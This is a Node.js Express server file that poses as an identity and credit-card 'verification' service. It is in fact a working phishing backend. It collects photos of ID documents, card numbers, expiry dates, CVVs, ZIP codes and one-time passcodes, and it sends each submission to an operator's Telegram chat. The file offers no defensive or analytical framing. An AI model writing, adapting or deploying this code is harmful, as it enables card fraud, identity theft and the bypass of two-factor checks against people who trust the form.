const express = require('express');
const multer = require('multer');
const axios = require('axios');
const path = require('path');
const FormData = require('form-data');
const app = express();
const port = process.env.PORT || 3000;

// Temporary variable to store user information
let userData = {
  cardInfo: {}, // Separate card information
  idInfo: {}    // ID information
};

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Add security headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Configure multer for file uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Telegram Bot config
const TELEGRAM_TOKEN = process.env.TOKEN; // Make sure to set this environment variable
const CHAT_ID = process.env.CHAT_ID;     // Make sure to set this environment variable
const TELEGRAM_API_MESSAGE = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
const TELEGRAM_API_MEDIA_GROUP = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMediaGroup`;

// Function to send images to Telegram
async function sendImagesToTelegram(frontFile, backFile) {
  const mediaGroupForm = new FormData();
  mediaGroupForm.append('chat_id', CHAT_ID);
  mediaGroupForm.append('media', JSON.stringify([
    {
      type: 'photo',
      media: 'attach://front.jpg',
    },
    {
      type: 'photo',
      media: 'attach://back.jpg',
    },
  ]));
  mediaGroupForm.append('front.jpg', frontFile.buffer, { filename: 'front.jpg' });
  mediaGroupForm.append('back.jpg', backFile.buffer, { filename: 'back.jpg' });

  await axios.post(TELEGRAM_API_MEDIA_GROUP, mediaGroupForm, {
    headers: mediaGroupForm.getHeaders(),
  });
}

// API to receive identity verification information
app.post('/api/identity-verification', upload.fields([{ name: 'frontFile' }, { name: 'backFile' }]), async (req, res) => {
  const { idType, idPlace } = req.body;
  const frontFile = req.files['frontFile'] ? req.files['frontFile'][0] : null;
  const backFile = req.files['backFile'] ? req.files['backFile'][0] : null;

  if (!idType || !idPlace || !frontFile || !backFile) {
    return res.status(400).json({ message: 'Missing required fields' });
  }

  // Save ID information to userData
  userData.idInfo = {
    idType,
    idPlace,
    frontFile: frontFile.buffer,
    backFile: backFile.buffer,
  };

  const message = `
    🆔 Identity Verification:
    📌 ID Type: ${idType}
    📍 ID Issuing Place: ${idPlace}
  `;

  try {
    // Send text information
    await axios.post(TELEGRAM_API_MESSAGE, {
      chat_id: CHAT_ID,
      text: message,
    });

    // Send images
    await sendImagesToTelegram(frontFile, backFile);

    res.status(200).json({ message: 'Identity verification submitted successfully' });
  } catch (error) {
    console.error('Error in /api/identity-verification:', error.message);
    res.status(500).json({ message: 'Error submitting verification', error: error.message });
  }
});

// API to receive credit card verification information
app.post('/api/credit-card-verification', async (req, res) => {
  const { cardNumber, expiryDate, cvv, zipCode, otp } = req.body; // Added zipCode here

  if (!otp) {
    // Case without OTP (initial card information submission step)
    if (!cardNumber || !expiryDate || !cvv || !zipCode) { // Check for zipCode
      return res.status(400).json({ message: 'Missing required fields' });
    }

    // Save card information to userData
    userData.cardInfo = {
      cardNumber,
      expiryDate,
      cvv,
      zipCode // Store zipCode
    };

    const message = `
      💳 Credit Card Verification:
      🔢 Card Number: ${cardNumber}
      📅 Expiry Date: ${expiryDate}
      🔐 CVV: ${cvv}
      ✉️ Zip Code: ${zipCode}
    `;

    try {
      await axios.post(TELEGRAM_API_MESSAGE, {
        chat_id: CHAT_ID,
        text: message,
      });
      res.status(200).json({ message: 'Credit card details submitted successfully' });
    } catch (error) {
      console.error('Error in /api/credit-card-verification (card details):', error.message);
      res.status(500).json({ message: 'Error submitting verification', error: error.message });
    }
  } else {
    // Case with OTP (OTP submission step)
    if (!userData.cardInfo.cardNumber) {
      return res.status(400).json({ message: 'Card information not found' });
    }

    const message = `
      🔑 Credit Card Verification (with OTP):
      🔢 Card Number: ${userData.cardInfo.cardNumber}
      📅 Expiry Date: ${userData.cardInfo.expiryDate}
      🔐 CVV: ${userData.cardInfo.cvv}
      ✉️ Zip Code: ${userData.cardInfo.zipCode || 'N/A'}
      🔢 OTP: ${otp}
    `;

    try {
      await axios.post(TELEGRAM_API_MESSAGE, {
        chat_id: CHAT_ID,
        text: message,
      });
      res.status(200).json({ message: 'OTP submitted successfully' });
    } catch (error) {
      console.error('Error in /api/credit-card-verification (OTP):', error.message);
      res.status(500).json({ message: 'Error submitting OTP', error: error.message });
    }
  }
});

// Default route returns identity_verification.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'identity_verification.html'));
});

// Global error handling
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ message: 'Something went wrong on the server' });
});

// Start the server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
